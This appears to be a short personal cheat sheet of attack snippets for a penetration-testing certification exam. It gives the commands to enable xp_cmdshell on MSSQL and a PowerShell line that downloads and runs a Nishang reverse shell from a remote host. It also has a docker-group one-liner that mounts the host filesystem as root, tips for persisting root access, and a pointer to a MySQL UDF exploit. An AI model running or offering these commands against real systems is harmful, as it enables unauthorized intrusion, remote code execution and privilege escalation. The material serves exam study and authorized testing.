# Software Vulnerabilities

---

This is just a collection of snippets for various pieces of software and how they can potentially be abused. And is mainly for quick reference, such as for a certification exam.

---

## Table of Contents
- [Windows](#windows)
	- [MSSQL](#mssql)
- [Linux](#linux)
	- [Docker](#docker)
	- [MySQL](#mysql)

---

## Windows

---

### MSSQL

#### xp_cmdshell with Nishang

Requires: MSSQL credentials

```sql
> EXEC SP_CONFIGURE 'show advanced options', 1
> reconfigure
> go

> EXEC SP_CONFIGURE 'xp_cmdshell', 1
> reconfigure
> go
```

This sets up the MSSQL server to allow using xp_cmdshell. Then we can execute a nishang rev shell as such (make sure the revshell executes itself at the bottom of the script):

```sql
xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString('http://10.0.0.1/revshell.ps1')"
```

---

## Linux

---

### Docker

#### PrivEsc One-Liner

Requires: Low-level user in the docker group

This command will create and mount a docker container containing the entire filesystem, and makes you root WITHIN THE CONTAINER. 

```bash
docker run -it -v /:/mnt alpine chroot /mnt
```

NOTE: Remember, if you're doing the OSCP, you have to become proper root, so docker root isn't the end (despite having unrestricted file access). Add a root ssh key, change password, create a SUID bash copy, etc. to become proper root. 

---

### MySQL

#### UDF

User-Defined Functions is a thing: https://www.exploit-db.com/exploits/1518

If MySQL runs as root, this can be used to privesc.